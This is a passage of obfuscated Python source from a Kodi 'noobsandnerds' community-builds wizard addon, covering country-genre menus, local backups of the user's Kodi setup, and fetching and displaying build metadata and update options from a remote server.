 iIiIIi1 ( 'folder' , 'New Zealand' , str ( url ) + '&genre=newzealand' , 'grab_builds' , 'newzealand.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Norwegian' , str ( url ) + '&genre=norwegian' , 'grab_builds' , 'norwegian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Pakistani' , str ( url ) + '&genre=pakistani' , 'grab_builds' , 'pakistani.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Polish' , str ( url ) + '&genre=polish' , 'grab_builds' , 'polish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Portuguese' , str ( url ) + '&genre=portuguese' , 'grab_builds' , 'portuguese.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Romanian' , str ( url ) + '&genre=romanian' , 'grab_builds' , 'romanian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Russian' , str ( url ) + '&genre=russian' , 'grab_builds' , 'russian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Singapore' , str ( url ) + '&genre=singapore' , 'grab_builds' , 'singapore.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Spanish' , str ( url ) + '&genre=spanish' , 'grab_builds' , 'spanish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Swedish' , str ( url ) + '&genre=swedish' , 'grab_builds' , 'swedish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Swiss' , str ( url ) + '&genre=swiss' , 'grab_builds' , 'swiss.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Syrian' , str ( url ) + '&genre=syrian' , 'grab_builds' , 'syrian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Tamil' , str ( url ) + '&genre=tamil' , 'grab_builds' , 'tamil.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Thai' , str ( url ) + '&genre=thai' , 'grab_builds' , 'thai.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Turkish' , str ( url ) + '&genre=turkish' , 'grab_builds' , 'turkish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'UK' , str ( url ) + '&genre=uk' , 'grab_builds' , 'uk.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'USA' , str ( url ) + '&genre=usa' , 'grab_builds' , 'usa.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Vietnamese' , str ( url ) + '&genre=vietnamese' , 'grab_builds' , 'vietnamese.png' , '' , '' , '' )
 if 5 - 5: OoOoOO00 % oo0oooooO0 + oOoO0o00OO0
 if 13 - 13: oOoO0o00OO0
def ii1II1II ( ) :
 i11i11II11i = 1
 III1II1i ( )
 II1Ii1I1i = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' , '' ) )
 OOooOooo0OOo0 = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' , 'my_full_backup.zip' ) )
 oo0o0OoOO0o0 = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' , 'my_full_backup_GUI_Settings.zip' ) )
 if 14 - 14: o0oOOo0O0Ooo % oOoO0o00OO0 + I1ii11iIi11i + OoO0O00
 if not os . path . exists ( II1Ii1I1i ) :
  os . makedirs ( II1Ii1I1i )
  if 76 - 76: OoO0O00 - i11iIiiIii + OoOoOO00 + Oo / OoooooooOO
 IiI1Iii1 = Ooooo ( heading = "Enter a name for this backup" )
 if ( not IiI1Iii1 ) :
  return False , 0
  if 43 - 43: Oo
 ooOoO = urllib . quote_plus ( IiI1Iii1 )
 ii1iII = xbmc . translatePath ( os . path . join ( II1Ii1I1i , ooOoO + '.zip' ) )
 O00oo = [ I1IiI ]
 OoOoooO000OO = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
 O00Oooi1 = [ I1IiI , 'cache' , 'system' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' ]
 oOOO0ooOO = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' , 'Thumbs.db' , '.gitignore' ]
 i11i11 = "Creating full backup of existing build"
 i11IiI1iiI11 = "Creating Community Build"
 Ii11Iii = "Archiving..."
 ooo00OoOO0o = ""
 oo0O0o = "Please Wait"
 if 85 - 85: I1ii11iIi11i - OoOoOO00 / I1ii11iIi11i + Oo - oo0oooooO0
 if o0oO0 == 'true' :
  iIIi1iI1I1IIi ( II , OOooOooo0OOo0 , i11i11 , Ii11Iii , ooo00OoOO0o , oo0O0o , O00oo , OoOoooO000OO )
  if 49 - 49: OoO0O00 - O0 / OoO0O00 * OoOoOO00 + iI1iiIiiII
 i1II = xbmcgui . Dialog ( ) . yesno ( "Do you want to include your addon_data folder?" , 'This contains ALL addon settings including passwords but may also contain important information such as skin shortcuts. We recommend MANUALLY removing the addon_data folders that aren\'t required.' , yeslabel = 'Yes' , nolabel = 'No' )
 if 35 - 35: II111iiii . I1IiiI / i1IIi / I1IiiI * ooOo
 if i1II == 0 :
  O00Oooi1 = [ I1IiI , 'cache' , 'system' , 'peripheral_data' , 'library' , 'keymaps' , 'addon_data' , 'Thumbnails' ]
  if 85 - 85: II111iiii . OOo00O0 % Oo % iii1I11ii1i1
 elif i1II == 1 :
  pass
  if 80 - 80: ooOo * iii1I11ii1i1 / iIii1I11I1II1 % ooOo / iIii1I11I1II1
 Iiii1 ( II )
 iIIi1iI1I1IIi ( II , ii1iII , i11IiI1iiI11 , Ii11Iii , ooo00OoOO0o , oo0O0o , O00Oooi1 , oOOO0ooOO )
 time . sleep ( 1 )
 if 36 - 36: oo0oooooO0
 oOooOO = xbmc . translatePath ( os . path . join ( II1Ii1I1i , ooOoO + '_guisettings.zip' ) )
 Ii1I1 = zipfile . ZipFile ( oOooOO , mode = 'w' )
 if 71 - 71: OoOoOO00 + iIii1I11I1II1 * ooOo . iI1iiIiiII % i11iIiiIii % iIii1I11I1II1
 try :
  Ii1I1 . write ( O00o0OO , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
 except : i11i11II11i = 0
 if 63 - 63: OoooooooOO * OoO0O00 / iii1I11ii1i1 - ooOo . iIii1I11I1II1 + oo0oooooO0
 try :
  Ii1I1 . write ( xbmc . translatePath ( os . path . join ( II , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
 except : pass
 if 44 - 44: i1IIi % I1IiiI % o0oOOo0O0Ooo
 Ii1I1 . close ( )
 if 9 - 9: Oo0Ooo % OoooooooOO - OO0oo0oOO
 if o0oO0 == 'true' :
  iIII11Iiii1 = zipfile . ZipFile ( oo0o0OoOO0o0 , mode = 'w' )
  try :
   iIII11Iiii1 . write ( O00o0OO , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
  except : i11i11II11i = 0
  if 95 - 95: I1IiiI
  try :
   iIII11Iiii1 . write ( xbmc . translatePath ( os . path . join ( II , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
  except : pass
  iIII11Iiii1 . close ( )
  if 99 - 99: O0
  if i11i11II11i == 0 :
   O0OoO000O0OO . ok ( "FAILED!" , 'The guisettings.xml file could not be found on your system, please reboot and try again.' , '' , '' )
   if 76 - 76: iI1iiIiiII - ooOo . Oo % o0oOOo0O0Ooo
  else :
   O0OoO000O0OO . ok ( "SUCCESS!" , 'You Are Now Backed Up and can share this build with the community.' )
   if 30 - 30: I1ii11iIi11i % iii1I11ii1i1 / iI1iiIiiII
   if o0oO0 == 'true' :
    O0OoO000O0OO . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=dodgerblue]' + OOooOooo0OOo0 , '[/COLOR]Universal Backup: [COLOR=dodgerblue]' + ii1iII + '[/COLOR]' )
    if 1 - 1: iI1iiIiiII - iii1I11ii1i1
   else :
    O0OoO000O0OO . ok ( "Build Location" , 'Universal Backup:[CR][COLOR=dodgerblue]' + ii1iII + '[/COLOR]' )
    if 45 - 45: OO0oo0oOO - Oo
    if 70 - 70: OoO0O00 % I1IiiI / I1IiiI . iii1I11ii1i1 % OOo00O0 . II111iiii
def I1ii1Ii1 ( ) :
 III1II1i ( )
 i1II = O0OoO000O0OO . yesno ( '[COLOR=gold]Create[/COLOR] [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] [COLOR=gold]Build[/COLOR]' , 'This backup will only work if you share your build on the [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] portal with the rest of the community. It will not work with any other installer/wizard, do you wish to continue?' )
 if 73 - 73: O0 . ooOo + i11iIiiIii + iIii1I11I1II1 - iii1I11ii1i1 / OoOoOO00
 if i1II == 1 :
  i11i11II11i = 1
  II1Ii1I1i = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' , '' ) )
  OOooOooo0OOo0 = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' , 'my_full_backup.zip' ) )
  oo0o0OoOO0o0 = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' , 'my_full_backup_GUI_Settings.zip' ) )
  if 99 - 99: I1ii11iIi11i * ooOo * I1ii11iIi11i - II111iiii + OO0oo0oOO
  if not os . path . exists ( II1Ii1I1i ) :
   os . makedirs ( II1Ii1I1i )
   if 72 - 72: o0oOOo0O0Ooo % I1IiiI / oo0oooooO0 - O0 + iii1I11ii1i1
  IiI1Iii1 = Ooooo ( heading = "Enter a name for this backup" )
  if 83 - 83: O0
  if ( not IiI1Iii1 ) :
   return False , 0
   if 89 - 89: Oo0Ooo + I1ii11iIi11i - o0oOOo0O0Ooo
  ooOoO = urllib . quote_plus ( IiI1Iii1 )
  ii1iII = xbmc . translatePath ( os . path . join ( II1Ii1I1i , ooOoO + '.zip' ) )
  if 40 - 40: OoO0O00 + OoO0O00
  if 94 - 94: oo0oooooO0 * iIii1I11I1II1 . iii1I11ii1i1
  O00oo = [ I1IiI ]
  OoOoooO000OO = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
  O00Oooi1 = [ I1IiI , 'cache' , 'system' , 'addons' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' , 'script.module.metahandler' , 'script.artistslideshow' , 'ArtistSlideshow' ]
  oOOO0ooOO = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' , 'Thumbs.db' , '.gitignore' ]
  i11i11 = "Creating full backup of existing build"
  i11IiI1iiI11 = "Creating Community Build"
  Ii11Iii = "Archiving..."
  ooo00OoOO0o = ""
  oo0O0o = "Please Wait"
  if 13 - 13: iIii1I11I1II1 * OoOoOO00 / iI1iiIiiII % OOo00O0 + ooOo
  if 41 - 41: I1ii11iIi11i
  if o0oO0 == 'true' :
   iIIi1iI1I1IIi ( II , OOooOooo0OOo0 , i11i11 , Ii11Iii , ooo00OoOO0o , oo0O0o , O00oo , OoOoooO000OO )
   if 5 - 5: Oo0Ooo
  i1II = xbmcgui . Dialog ( ) . yesno ( "Do you want to include your addon_data folder?" , 'This contains ALL addon settings including passwords but may also contain important information such as skin shortcuts. We recommend MANUALLY removing the addon_data folders that aren\'t required.' , yeslabel = 'Yes' , nolabel = 'No' )
  if 100 - 100: OO0oo0oOO + iIii1I11I1II1
  if 59 - 59: oOoO0o00OO0
  if i1II == 0 :
   O00Oooi1 = [ I1IiI , 'cache' , 'system' , 'addons' , 'peripheral_data' , 'library' , 'keymaps' , 'addon_data' , 'Thumbnails' ]
   if 89 - 89: OoOoOO00 % iIii1I11I1II1
  elif i1II == 1 :
   pass
   if 35 - 35: I1ii11iIi11i + iI1iiIiiII - OoOoOO00 % ooOo % o0oOOo0O0Ooo % OoOoOO00
   if 45 - 45: I1IiiI * Oo % OoO0O00
  i1iii1ii ( )
  Iiii1 ( II )
  iIIi1iI1I1IIi ( II , ii1iII , i11IiI1iiI11 , Ii11Iii , ooo00OoOO0o , oo0O0o , O00Oooi1 , oOOO0ooOO )
  if 24 - 24: OOo00O0 - iii1I11ii1i1 * ooOo
  if 87 - 87: OO0oo0oOO - I1ii11iIi11i % I1ii11iIi11i . ooOo / I1ii11iIi11i
  try :
   os . remove ( O0o0O00Oo0o0 )
  except :
   pass
   if 6 - 6: OoOoOO00 / iIii1I11I1II1 * OoooooooOO * i11iIiiIii
  try :
   os . remove ( OOoOO0oo0ooO )
  except :
   pass
   if 79 - 79: oOoO0o00OO0 % OoO0O00
  time . sleep ( 1 )
  if 81 - 81: i11iIiiIii + i11iIiiIii * OoO0O00 + oOoO0o00OO0
  if 32 - 32: O0 . OoooooooOO
  oOooOO = xbmc . translatePath ( os . path . join ( II1Ii1I1i , ooOoO + '_guisettings.zip' ) )
  Ii1I1 = zipfile . ZipFile ( oOooOO , mode = 'w' )
  if 15 - 15: I1IiiI . OoO0O00
  try :
   Ii1I1 . write ( O00o0OO , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
   if 17 - 17: i11iIiiIii / Oo0Ooo . OoO0O00 / I1IiiI
  except :
   i11i11II11i = 0
   if 38 - 38: i1IIi . I1ii11iIi11i % OO0oo0oOO + iIii1I11I1II1 + O0
  try :
   Ii1I1 . write ( xbmc . translatePath ( os . path . join ( II , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
   if 47 - 47: OoO0O00 + oOoO0o00OO0 / II111iiii
  except :
   pass
   if 97 - 97: I1ii11iIi11i / I1IiiI % O0 + i1IIi - OOo00O0
  Ii1I1 . close ( )
  if 38 - 38: o0oOOo0O0Ooo % iI1iiIiiII + i11iIiiIii + oo0oooooO0 + OOo00O0 / i11iIiiIii
  if 94 - 94: oo0oooooO0 - Oo0Ooo + ooOo
  if o0oO0 == 'true' :
   iIII11Iiii1 = zipfile . ZipFile ( oo0o0OoOO0o0 , mode = 'w' )
   if 59 - 59: iii1I11ii1i1 . I1IiiI - iIii1I11I1II1 + iIii1I11I1II1
   try :
    iIII11Iiii1 . write ( O00o0OO , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
    if 56 - 56: ooOo + OOo00O0
   except :
    i11i11II11i = 0
    if 32 - 32: II111iiii + OoOoOO00 % OOo00O0 / OoOoOO00 + I1ii11iIi11i
   try :
    iIII11Iiii1 . write ( xbmc . translatePath ( os . path . join ( II , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
    if 2 - 2: i11iIiiIii - iI1iiIiiII + OoO0O00 % iii1I11ii1i1 * OO0oo0oOO
   except :
    pass
    if 54 - 54: O0 - oo0oooooO0 . Oo % oo0oooooO0 + oo0oooooO0
   iIII11Iiii1 . close ( )
   if 36 - 36: Oo % i11iIiiIii
  if i11i11II11i == 0 :
   O0OoO000O0OO . ok ( "FAILED!" , 'The guisettings.xml file could not be found on your system, please reboot and try again.' , '' , '' )
   if 47 - 47: i1IIi + II111iiii . Oo0Ooo * ooOo . iii1I11ii1i1 / i1IIi
  else :
   O0OoO000O0OO . ok ( "SUCCESS!" , 'You Are Now Backed Up and can share this build with the community.' )
   if 50 - 50: iI1iiIiiII / i1IIi % OoooooooOO
   if o0oO0 == 'true' :
    O0OoO000O0OO . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=dodgerblue]' + OOooOooo0OOo0 , '[/COLOR]Universal Backup (this will ONLY work for sharing on the [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] portal):[CR][COLOR=dodgerblue]' + ii1iII + '[/COLOR]' )
    if 83 - 83: I1ii11iIi11i * I1ii11iIi11i + Oo
   else :
    O0OoO000O0OO . ok ( "Build Location" , 'Universal Backup (this will ONLY work for sharing on the [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] portal):[CR][COLOR=dodgerblue]' + ii1iII + '[/COLOR]' )
    if 57 - 57: O0 - O0 . I1ii11iIi11i / o0oOOo0O0Ooo / OO0oo0oOO
    if 20 - 20: Oo * II111iiii - OoOoOO00 - ooOo * iI1iiIiiII
def I1i1II1 ( url , video ) :
 iIII1I111III = 'http://120.24.252.100/TI/Community_Builds/community_builds_premium.php?id=%s' % ( url )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOooI1 = re . compile ( 'path="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ooiiI1IIIii = re . compile ( 'myart="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iIOO0OOoooo0o = re . compile ( 'artpack="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1i11OO = re . compile ( 'videopreview="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IiIi1Ii = re . compile ( 'videoguide1="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiIIiI11II1 = re . compile ( 'videoguide2="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oooOo = re . compile ( 'videoguide3="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oOoO0Oo0 = re . compile ( 'videoguide4="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i11i11i = re . compile ( 'videoguide5="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiI1iI = re . compile ( 'videolabel1="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Ooo00O0 = re . compile ( 'videolabel2="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OoO0OOoO0 = re . compile ( 'videolabel3="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiI11i = re . compile ( 'videolabel4="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0Oo = re . compile ( 'videolabel5="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1i1i1iii = re . compile ( 'name="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiI1i = re . compile ( 'author="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ii1iii1i = re . compile ( 'version="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 II11iI1iiI = re . compile ( 'description="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i11I = re . compile ( 'DownloadURL="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0oO0o0oo0O0 = re . compile ( 'UpdateURL="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O0oo00oOOO0o = re . compile ( 'UpdateDate="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 II1i = re . compile ( 'UpdateDesc="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Ii1IIiI1i = re . compile ( 'updated="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I111iiIIiI1I = re . compile ( 'defaultskin="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ooO00Oo = re . compile ( 'skins="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Iiii1Ii1I = re . compile ( 'videoaddons="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oooOOOOOi1iIii = re . compile ( 'audioaddons="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0O0ooooooo00 = re . compile ( 'programaddons="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1111ii11IIII = re . compile ( 'pictureaddons="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IiIi1II111I = re . compile ( 'sources="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o00oIIi1i1 = re . compile ( 'adult="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0O0Ooo = re . compile ( 'guisettings="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O0oO00oOOooO = re . compile ( 'thumb="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IiI = re . compile ( 'fanart="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 if 4 - 4: OoooooooOO + OOo00O0 . i1IIi / O0 - O0
 oOooOOo00ooO = ooiiI1IIIii [ 0 ] if ( len ( ooiiI1IIIii ) > 0 ) else ''
 o0OO0oooo = iIOO0OOoooo0o [ 0 ] if ( len ( iIOO0OOoooo0o ) > 0 ) else ''
 iI1i1IiIIIIi = oOOooI1 [ 0 ] if ( len ( oOOooI1 ) > 0 ) else ''
 ooO = I1i1i1iii [ 0 ] if ( len ( I1i1i1iii ) > 0 ) else ''
 I11II1i1 = iiI1i [ 0 ] if ( len ( iiI1i ) > 0 ) else ''
 Oo0 = ii1iii1i [ 0 ] if ( len ( ii1iii1i ) > 0 ) else ''
 i1i1IIii1i1 = II11iI1iiI [ 0 ] if ( len ( II11iI1iiI ) > 0 ) else 'No information available'
 OooiiIi1i = Ii1IIiI1i [ 0 ] if ( len ( Ii1IIiI1i ) > 0 ) else ''
 IiI1ii11I1 = I111iiIIiI1I [ 0 ] if ( len ( I111iiIIiI1I ) > 0 ) else ''
 I1i1iI = ooO00Oo [ 0 ] if ( len ( ooO00Oo ) > 0 ) else ''
 I1iI1I1ii1 = Iiii1Ii1I [ 0 ] if ( len ( Iiii1Ii1I ) > 0 ) else ''
 iIIi1 = oooOOOOOi1iIii [ 0 ] if ( len ( oooOOOOOi1iIii ) > 0 ) else ''
 o0Ooo0o0Oo = o0O0ooooooo00 [ 0 ] if ( len ( o0O0ooooooo00 ) > 0 ) else ''
 oo00ooooOOo00 = I1111ii11IIII [ 0 ] if ( len ( I1111ii11IIII ) > 0 ) else ''
 ii1iOO00Oooo000 = IiIi1II111I [ 0 ] if ( len ( IiIi1II111I ) > 0 ) else ''
 iI1 = o00oIIi1i1 [ 0 ] if ( len ( o00oIIi1i1 ) > 0 ) else ''
 ii111iiIii = o0O0Ooo [ 0 ] if ( len ( o0O0Ooo ) > 0 ) else 'None'
 oO0o = i11I [ 0 ] if ( len ( i11I ) > 0 ) else 'None'
 iIiI = o0oO0o0oo0O0 [ 0 ] if ( len ( o0oO0o0oo0O0 ) > 0 ) else 'None'
 iIIiiiI1iI1 = O0oo00oOOO0o [ 0 ] if ( len ( O0oo00oOOO0o ) > 0 ) else 'None'
 oO00000oO0o0O = II1i [ 0 ] if ( len ( II1i ) > 0 ) else 'None'
 ii11i = I1i11OO [ 0 ] if ( len ( I1i11OO ) > 0 ) else 'None'
 O00oO0 = IiIi1Ii [ 0 ] if ( len ( IiIi1Ii ) > 0 ) else 'None'
 O0Oo00OoOo = iiIIiI11II1 [ 0 ] if ( len ( iiIIiI11II1 ) > 0 ) else 'None'
 ii1ii111 = oooOo [ 0 ] if ( len ( oooOo ) > 0 ) else 'None'
 i11111I1I = oOoO0Oo0 [ 0 ] if ( len ( oOoO0Oo0 ) > 0 ) else 'None'
 ii1Oo0000oOo = i11i11i [ 0 ] if ( len ( i11i11i ) > 0 ) else 'None'
 Iii = iiI1iI [ 0 ] if ( len ( iiI1iI ) > 0 ) else 'None'
 I1iiiiI1iI = Ooo00O0 [ 0 ] if ( len ( Ooo00O0 ) > 0 ) else 'None'
 iIiiiii1i = OoO0OOoO0 [ 0 ] if ( len ( OoO0OOoO0 ) > 0 ) else 'None'
 iiIi1IIiI = iiI11i [ 0 ] if ( len ( iiI11i ) > 0 ) else 'None'
 i1oO0OO0 = o0Oo [ 0 ] if ( len ( o0Oo ) > 0 ) else 'None'
 i1oOOOOOOOoO = O0oO00oOOooO [ 0 ] if ( len ( O0oO00oOOooO ) > 0 ) else 'None'
 I1 = IiI [ 0 ] if ( len ( IiI ) > 0 ) else 'None'
 if 34 - 34: Oo0Ooo - i1IIi - OOo00O0 - i1IIi
 Oo0oO00 = open ( iiii11I , mode = 'w+' )
 Oo0oO00 . write ( 'id="' + str ( video ) + '"\nname="' + ooO + '"\nversion="' + Oo0 + '"' )
 Oo0oO00 . close ( )
 if 62 - 62: iii1I11ii1i1 / ooOo % Oo0Ooo . OoooooooOO / i11iIiiIii / iI1iiIiiII
 OooO0O0Ooo = open ( Ooo0OO0oOO , mode = 'r' )
 oO0O = OooO0O0Ooo . read ( )
 OooO0O0Ooo . close ( )
 if 25 - 25: ooOo % I1IiiI + i11iIiiIii + O0 * OoooooooOO
 i1IIII1iii11I = re . compile ( 'id="(.+?)"' ) . findall ( oO0O )
 ooO0 = i1IIII1iii11I [ 0 ] if ( len ( i1IIII1iii11I ) > 0 ) else 'None'
 o0Iiii = re . compile ( 'version="(.+?)"' ) . findall ( oO0O )
 IIIi1I1IIii1II = o0Iiii [ 0 ] if ( len ( o0Iiii ) > 0 ) else 'None'
 I1i1I , i1111iI1 , Oo0oOOOOo = url . partition ( '&' )
 iIiIIi1 ( '' , '[COLOR=yellow]IMPORTANT:[/COLOR] Install Instructions' , '' , 'instructions_2' , 'noobsandnerds.png' , '' , '' , '' )
 ooO00OO0 ( '[COLOR=yellow]Description:[/COLOR] This contains important info from the build author' , 'None' , 'description' , 'BUILDDETAILS.png' , I1 , ooO , I11II1i1 , Oo0 , i1i1IIii1i1 , OooiiIi1i , I1i1iI , I1iI1I1ii1 , iIIi1 , o0Ooo0o0Oo , oo00ooooOOo00 , ii1iOO00Oooo000 , iI1 )
 if 14 - 14: OoooooooOO . o0oOOo0O0Ooo . iii1I11ii1i1
 if ooO0 == I1i1I and IIIi1I1IIii1II != Oo0 :
  iIiIIi1 ( '' , '[COLOR=orange]----------------- UPDATE AVAILABLE ------------------[/COLOR]' , 'None' , '' , 'noobsandnerds.png' , '' , '' , '' )
  i1iIIIi1i ( '[COLOR=dodgerblue]1. Update:[/COLOR] Overwrite My Current Setup & Install New Build' , oO0o , 'restore_community' , i1oOOOOOOOoO , '' , 'update' , ooO , IiI1ii11I1 , ii111iiIii , o0OO0oooo )
  i1iIIIi1i ( '[COLOR=dodgerblue]2. Update:[/COLOR] Keep My Library & Profiles' , oO0o , 'restore_community' , i1oOOOOOOOoO , '' , 'updatelibprofile' , ooO , IiI1ii11I1 , ii111iiIii , o0OO0oooo )
  i1iIIIi1i ( '[COLOR=dodgerblue]3. Update:[/COLOR] Keep My Library Only' , oO0o , 'restore_community' , i1oOOOOOOOoO , '' , 'updatelibrary' , ooO , IiI1ii11I1 , ii111iiIii , o0OO0oooo )
  i1iIIIi1i ( '[COLOR=dodgerblue]4. Update:[/COLOR] Keep My Profiles Only' , oO0o , 'restore_community' , i1oOOOOOOOoO , '' , 'updateprofiles' , ooO , IiI1ii11I1 , ii111iiIii , o0OO0oooo )
  if 50 - 50: OOo00O0 * OoOoOO00 + I1ii11iIi11i - i11iIiiIii + Oo0Ooo * I1ii11iIi11i
 if ii11i != 'None' or O00oO0 != 'None' or O0Oo00OoOo != 'None' or ii1ii111 != 'None' or i11111I1I != 'None' or ii1Oo0000oOo != 'None' :
  iIiIIi1 ( '' , '[COLOR=orange]------------------ VIDEO GUIDES -----------------[/COLOR]' , 'None' , '' , 'noobsandnerds.png' , '' , '' , '' )
  if 20 - 20: iI1iiIiiII / o0oOOo0O0Ooo % OoOoOO00
 if ii11i != 'None' :
  iIiIIi1 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] Preview[/COLOR]' , ii11i , 'play_video' , 'Video_Preview.png' , I1 , '' , '' )
  if 69 - 69: iI1iiIiiII - i1IIi % oo0oooooO0 . Oo - Oo
 if O00oO0 != 'None' :
  iIiIIi1 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + Iii + '[/COLOR]' , O00oO0 , 'play_video' , 'Video_Guide.png' , I1 , '' , '' )
  if 65 - 65: Oo + II111iiii
 if O0Oo00OoOo != 'None' :
  iIiIIi1 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + I1iiiiI1iI + '[/COLOR]' , O0Oo00OoOo , 'play_video' , 'Video_Guide.png' , I1 , '' , '' )
  if 61 - 61: i11iIiiIii * ooOo % Oo0Ooo * iI1iiIiiII - OoooooooOO - OoO0O00
 if ii1ii111 != 'None' :
  iIiIIi1 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + iIiiiii1i + '[/COLOR]' , ii1ii111 , 'play_video' , 'Video_Guide.png' , I1 , '' , '' )
  if 83 - 83: OOo00O0 / Oo
 if i11111I1I != 'None' :
  iIiIIi1 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + iiIi1IIiI + '[/COLOR]' , i11111I1I , 'play_video' , 'Video_Guide.png' , I1 , '' , '' )
  if 39 - 39: oOoO0o00OO0 + iii1I11ii1i1
 if ii1Oo0000oOo != 'None' :
  iIiIIi1 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + i1oO0OO0 + '[/COLOR]' , ii1Oo0000oOo , 'play_video' , 'Video_Guide.png' , I1 , '' , '' )
  if 9 - 9: I1IiiI % iii1I11ii1i1 . Oo0Ooo * I1IiiI
 if ooO0 != I1i1I :
  iIiIIi1 ( '' , '[COLOR=orange]------------------ INSTALL OPTIONS ------------------[/COLOR]' , 'None' , '' , 'noobsandnerds.png' , '' , '' , '' )
  if 99 - 99: O0 . o0oOOo0O0Ooo % iii1I11ii1i1 - Oo0Ooo / iii1I11ii1i1
 if oO0o == 'None' :
  i1iIIIi1i ( '[COLOR=orange]Sorry this build is currently unavailable[/COLOR]' , '' , '' , '' , '' , '' , '' , '' , '' , '' )
